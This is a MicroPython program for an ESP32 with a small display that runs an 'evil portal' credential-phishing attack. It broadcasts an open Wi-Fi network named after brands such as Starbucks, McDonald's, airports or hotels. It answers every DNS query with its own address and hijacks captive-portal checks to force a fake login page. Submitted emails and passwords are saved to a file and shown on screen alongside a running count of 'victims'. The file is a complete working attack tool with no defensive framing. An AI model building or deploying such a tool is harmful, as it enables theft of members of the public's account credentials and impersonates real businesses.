import network
import socket
import time
import machine
import gc
import _thread

# ==========================================
# DISPLAY SETUP
# ==========================================
TFT_SCLK, TFT_MOSI, TFT_MISO = 14, 13, 12
TFT_DC, TFT_CS, TFT_RST, TFT_BL = 2, 15, 4, 27

try:
    from ili9341 import Display
except:
    print("ERROR: ili9341 library not found!")
    import sys
    sys.exit()

machine.Pin(TFT_BL, machine.Pin.OUT).value(1)
display_spi = machine.SPI(1, baudrate=40000000, sck=machine.Pin(TFT_SCLK), 
                         mosi=machine.Pin(TFT_MOSI), miso=machine.Pin(TFT_MISO))
display = Display(display_spi, cs=machine.Pin(TFT_CS), dc=machine.Pin(TFT_DC), 
                 rst=machine.Pin(TFT_RST), width=320, height=240, rotation=180)

# Colors
BG_COLOR = 0x0000
RED = 0xF800
GREEN = 0x07E0
YELLOW = 0xFFE0
CYAN = 0x07FF
WHITE = 0xFFFF
PURPLE = 0x780F
ORANGE = 0xFD20

display.clear(BG_COLOR)

# ==========================================
# DRAWING FUNCTIONS
# ==========================================
def draw_text(x, y, text, color, bg=BG_COLOR):
    try:
        display.draw_text8x8(x, y, str(text)[:38], color, bg)
    except:
        pass

def fill_rect(x, y, w, h, color):
    display.fill_rectangle(x, y, w, h, color)

def clear_area(x, y, w, h):
    fill_rect(x, y, w, h, BG_COLOR)

def draw_header():
    fill_rect(0, 0, 320, 25, PURPLE)
    draw_text(5, 8, "EVIL PORTAL - LIVE", WHITE, PURPLE)
    draw_text(240, 8, "janocic", YELLOW, PURPLE)

def draw_status_bar(ssid, victims, captured):
    clear_area(0, 28, 320, 40)
    draw_text(5, 30, f"SSID: {ssid[:25]}", CYAN)
    draw_text(5, 42, f"IP: 192.168.4.1:80", GREEN)
    draw_text(5, 54, f"Victims: {victims} | Captured: {captured}", YELLOW)

def draw_separator():
    for i in range(0, 320, 2):
        display.draw_pixel(i, 68, PURPLE)

def draw_victim_list_header():
    clear_area(0, 72, 320, 12)
    draw_text(5, 74, "CONNECTED DEVICES:", ORANGE)

def draw_victim(index, ip, mac, y_pos):
    if y_pos > 220:
        return False
    clear_area(0, y_pos, 320, 20)
    draw_text(5, y_pos, f"{index}. {ip}", GREEN)
    draw_text(5, y_pos + 10, f"   MAC: {mac[:17]}", WHITE)
    return True

def draw_captured_header(y_pos):
    if y_pos > 220:
        return False
    clear_area(0, y_pos, 320, 12)
    draw_text(5, y_pos, "CAPTURED CREDS:", RED)
    return True

def draw_credential(email, password, y_pos):
    if y_pos > 220:
        return False
    clear_area(0, y_pos, 320, 20)
    draw_text(5, y_pos, f"U: {email[:35]}", YELLOW)
    draw_text(5, y_pos + 10, f"P: {password[:35]}", RED)
    return True

# ==========================================
# GLOBAL STATE
# ==========================================
connected_victims = {}
captured_creds = []
victim_count = 0
cred_count = 0
display_lock = _thread.allocate_lock()

TARGETS = [
    "Starbucks_WiFi",
    "McDonalds_Free",
    "Hotel_Guest",
    "Airport_WiFi",
    "FREE_WiFi"
]
current_ssid = TARGETS[0]

# ==========================================
# UI UPDATE THREAD
# ==========================================
def update_display_loop():
    global victim_count, cred_count
    
    with display_lock:
        draw_header()
        draw_separator()

    while True:
        try:
            with display_lock:
                draw_status_bar(current_ssid, victim_count, cred_count)
                
                y = 86
                draw_victim_list_header()
                y = 90
                
                victim_list = sorted(connected_victims.items(), 
                                   key=lambda x: x[1]['last_seen'], 
                                   reverse=True)[:5]
                
                for idx, (ip, info) in enumerate(victim_list, 1):
                    if not draw_victim(idx, ip, info['mac'], y):
                        break
                    y += 22
                
                if captured_creds:
                    y += 5
                    if draw_captured_header(y):
                        y += 14
                        for cred in captured_creds[-3:]:
                            if not draw_credential(cred['email'], cred['password'], y):
                                break
                            y += 22
            
            time.sleep(1)
            gc.collect()
            
        except Exception as e:
            print(f"Display update error: {e}")
            time.sleep(2)

# ==========================================
# WIFI ACCESS POINT
# ==========================================
ap = network.WLAN(network.AP_IF)
ap.active(True)
ap.config(essid=current_ssid, authmode=0)
print(f"[AP] Started: {current_ssid}")

# ==========================================
# FIXED DNS SERVER
# ==========================================
def dns_server():
    """Improved DNS server with proper packet handling"""
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udps.bind(('192.168.4.1', 53))
    
    print("[DNS] Server started on port 53")
    
    while True:
        try:
            data, addr = udps.recvfrom(512)
            
            # Parse DNS query
            if len(data) < 12:
                continue
            
            # Build proper DNS response
            response = bytearray(data[:2])  # Transaction ID
            response += b'\x81\x80'  # Flags: Standard query response, No error
            response += data[4:6]    # Questions count
            response += data[4:6]    # Answer RRs (same as questions)
            response += b'\x00\x00'  # Authority RRs
            response += b'\x00\x00'  # Additional RRs
            
            # Copy question section
            response += data[12:]
            
            # Add answer section
            response += b'\xc0\x0c'              # Pointer to domain name
            response += b'\x00\x01'              # Type A (IPv4 address)
            response += b'\x00\x01'              # Class IN
            response += b'\x00\x00\x00\x3c'      # TTL (60 seconds)
            response += b'\x00\x04'              # Data length (4 bytes)
            response += bytes([192, 168, 4, 1])  # IP: 192.168.4.1
            
            udps.sendto(response, addr)
            
        except Exception as e:
            print(f"[DNS] Error: {e}")
            time.sleep_ms(50)

# ==========================================
# FIXED HTTP SERVER
# ==========================================

LOGIN_HTML = """HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Connection: close

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta charset="UTF-8">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,-apple-system,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{background:#fff;padding:40px;border-radius:15px;box-shadow:0 20px 60px rgba(0,0,0,.3);width:100%;max-width:400px}
.logo{text-align:center;font-size:64px;margin-bottom:20px}
h2{color:#333;text-align:center;margin-bottom:30px;font-size:24px}
.form-group{margin-bottom:20px}
input{width:100%;padding:15px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;transition:border .3s}
input:focus{outline:0;border-color:#667eea}
button{width:100%;padding:15px;background:#667eea;color:#fff;border:0;border-radius:8px;font-size:18px;font-weight:600;cursor:pointer;transition:background .3s}
button:hover{background:#5568d3}
.footer{text-align:center;margin-top:20px;color:#888;font-size:14px}
</style>
</head>
<body>
<div class="container">
<div class="logo">📶</div>
<h2>WiFi Authentication</h2>
<form method="POST" action="/login">
<div class="form-group">
<input type="email" name="email" placeholder="Email Address" required>
</div>
<div class="form-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit">Connect to WiFi</button>
<div class="footer">Secure Connection</div>
</form>
</div>
</body>
</html>
"""

SUCCESS_HTML = """HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Connection: close

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="refresh" content="2;url=https://www.google.com">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#4CAF50;color:#fff}
.success{text-align:center;animation:fadeIn 0.5s}
@keyframes fadeIn{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
h1{font-size:48px;margin-bottom:20px}
</style>
</head>
<body>
<div class="success">
<h1>✓ Connected!</h1>
<p style="font-size:20px">You now have internet access</p>
</div>
</body>
</html>
"""

# Redirect page for captive portal detection
REDIRECT_HTML = """HTTP/1.1 302 Found
Location: http://192.168.4.1/
Connection: close

"""

def url_decode(s):
    """Simple URL decoder"""
    s = s.replace('+', ' ')
    s = s.replace('%40', '@')
    s = s.replace('%21', '!')
    s = s.replace('%23', '#')
    s = s.replace('%24', '$')
    s = s.replace('%26', '&')
    s = s.replace('%2B', '+')
    s = s.replace('%2F', '/')
    s = s.replace('%3A', ':')
    s = s.replace('%3D', '=')
    s = s.replace('%3F', '?')
    return s

def web_server():
    """Fixed HTTP server with proper captive portal detection"""
    global victim_count, cred_count
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('192.168.4.1', 80))
    s.listen(5)
    
    print("[HTTP] Server started on port 80")
    
    # Paths that trigger captive portal detection
    captive_paths = [
        '/generate_204',           # Android
        '/gen_204',                # Android
        '/ncsi.txt',               # Windows
        '/connecttest.txt',        # Windows
        '/hotspot-detect.html',    # iOS/macOS
        '/library/test/success.html',  # iOS/macOS
        '/success.txt',            # Firefox
        '/canonical.html'          # Ubuntu
    ]
    
    while True:
        try:
            conn, addr = s.accept()
            conn.settimeout(3.0)
            
            client_ip = addr[0]
            
            # Track victim
            if client_ip not in connected_victims:
                connected_victims[client_ip] = {
                    'mac': 'Unknown',
                    'first_seen': time.time(),
                    'last_seen': time.time()
                }
                victim_count = len(connected_victims)
                print(f"[NEW VICTIM] {client_ip}")
            else:
                connected_victims[client_ip]['last_seen'] = time.time()
            
            # Read HTTP request
            request = b""
            try:
                while True:
                    chunk = conn.recv(512)
                    if not chunk:
                        break
                    request += chunk
                    if b'\r\n\r\n' in request:
                        # Check if there's a body (POST)
                        if b'POST' in request[:20]:
                            headers = request.split(b'\r\n\r\n')[0]
                            if b'Content-Length:' in headers:
                                content_length = 0
                                for line in headers.split(b'\r\n'):
                                    if line.startswith(b'Content-Length:'):
                                        content_length = int(line.split(b':')[1].strip())
                                        break
                                # Read body
                                body_read = len(request.split(b'\r\n\r\n')[1])
                                while body_read < content_length:
                                    chunk = conn.recv(512)
                                    if not chunk:
                                        break
                                    request += chunk
                                    body_read += len(chunk)
                        break
            except:
                pass
            
            request_str = request.decode('utf-8', 'ignore')
            
            # Parse request line
            request_line = request_str.split('\r\n')[0] if '\r\n' in request_str else request_str
            print(f"[HTTP] {client_ip}: {request_line[:60]}")
            
            # Handle POST (credentials submitted)
            if 'POST /login' in request_str or 'POST' in request_str[:20]:
                try:
                    body = request_str.split('\r\n\r\n')[-1]
                    params = {}
                    for param in body.split('&'):
                        if '=' in param:
                            key, val = param.split('=', 1)
                            params[key] = url_decode(val)
                    
                    email = params.get('email', 'N/A')
                    password = params.get('password', 'N/A')
                    
                    if email != 'N/A' and password != 'N/A':
                        captured_creds.append({
                            'ip': client_ip,
                            'email': email,
                            'password': password,
                            'time': time.time()
                        })
                        cred_count = len(captured_creds)
                        
                        try:
                            with open('captured.txt', 'a') as f:
                                f.write(f"{time.time()}|{client_ip}|{email}|{password}\n")
                        except:
                            pass
                        
                        print(f"[CAPTURED] {email} : {password}")
                        conn.send(SUCCESS_HTML.encode())
                    else:
                        conn.send(LOGIN_HTML.encode())
                    
                except Exception as e:
                    print(f"[ERROR] Parse error: {e}")
                    conn.send(LOGIN_HTML.encode())
            
            # Handle captive portal detection requests
            elif any(path in request_str for path in captive_paths):
                # Return redirect to force captive portal popup
                conn.send(REDIRECT_HTML.encode())
            
            # All other requests -> show login page
            else:
                conn.send(LOGIN_HTML.encode())
            
            conn.close()
            gc.collect()
            
        except Exception as e:
            print(f"[HTTP] Error: {e}")
            try:
                conn.close()
            except:
                pass

# ==========================================
# MAIN
# ==========================================
def main():
    print("\n" + "="*50)
    print("EVIL PORTAL - LIVE DISPLAY (FIXED)")
    print("by janocic - 2025-11-17")
    print("="*50)
    print(f"SSID: {current_ssid}")
    print("IP: 192.168.4.1")
    print("="*50 + "\n")
    
    # Start display update thread
    _thread.start_new_thread(update_display_loop, ())
    time.sleep(0.5)
    
    # Start DNS server thread
    _thread.start_new_thread(dns_server, ())
    time.sleep(0.5)
    
    # Start web server (main thread)
    web_server()

if __name__ == "__main__":
    main()